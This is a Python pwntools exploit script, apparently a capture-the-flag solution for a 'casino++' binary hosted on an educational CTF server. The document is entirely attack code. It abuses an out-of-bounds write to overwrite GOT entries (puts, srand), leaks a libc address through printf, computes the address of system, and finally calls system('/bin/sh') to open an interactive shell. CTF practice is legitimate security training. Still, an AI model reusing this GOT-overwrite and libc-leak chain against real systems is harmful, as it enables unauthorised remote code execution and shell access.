#coding=utf-8
from pwn import *
import sys

elf = ELF('./libc.so')
r = remote('edu-ctf.csie.org', 10176)
#r = process('./casino++')
lottery = 0x6020b0
guess = 0x6020d0
name = 0x6020f0
seed = 0x602100
age = 0x602104

welcome = 0x400926
casino = 0x40095d 
puts = 0x602020
printf_plt = 0x400700
printf = 0x602030
srand = 0x602040
__libc_start_main_plt = 0x601ff0

if sys.argv[1] == 'debug':
    gdb.attach(r)

# store the shellcode in name since we will jump to name at last
shellcode = '/bin/sh\x00' + 'a' * 8 + p64(__libc_start_main_plt) 
r.recvuntil('Your name: ')
r.sendline(shellcode)

# age is from the shellcode
r.recvuntil('Your age: ')
r.send(str(21))

# compute the random number of the seed from shellcode
p = process('./get_rand')
var_seed = int(shellcode[seed - name : seed - name + 4][::-1].encode('hex'), 16)
p.sendline(str(var_seed))
lottery = p.recvall(1).split('\n')[:-1]
lottery3 = lottery[12:]
lottery2 = lottery[6:12]
lottery = lottery[:6]
p.close()

def casino_for_guess(val):
    global r
    for i in range(6):
        print r.recvuntil('Chose the number {}: '.format(i))
        if(val):r.sendline(val[i]) 
        else: r.sendline('0')

def casino_while(addr, val, pos):
    global r
    print r.recvuntil('Change the number? [1:yes 0:no]: ')
    r.sendline('1')
    print r.recvuntil('Which number [1 ~ 6]: ')
    r.sendline(str((addr - guess)/4 + pos))
    print r.recvuntil('Chose the number ')
    r.sendline(str(val))


# To set puts() got to casino()
# first first loop we do not go into win
casino_for_guess(0)
casino_while(puts, casino, 1)
# first second loop to send correct guess
# 第二次一定要用 sendline，不能用 send......不知名錯誤
casino_for_guess(lottery)
casino_while(puts, 0, 2)

# To set srand() got to printf()
# second first loop
casino_for_guess(0)
casino_while(srand, printf_plt, 1)
# second second loop
casino_for_guess(lottery)
casino_while(srand, 0, 2)

# To get the leaked message from printf
__libc_start_main_addr = u64(r.recvuntil('\n$$$$$$$')[5:11] + '\0\0')
base = __libc_start_main_addr - elf.symbols.__libc_start_main
system = base + elf.symbols.system

# Change seed's address to bin_sh_libc
# third first loop
casino_for_guess(lottery2)
casino_while(seed, name, 1)

# Change srand to system
# forth first loop
casino_for_guess(0)
casino_while(srand, system & 0xffffffff, 1)
# forth second loop
casino_for_guess(lottery3)
casino_while(srand, system >> 32, 2)

r.interactive()
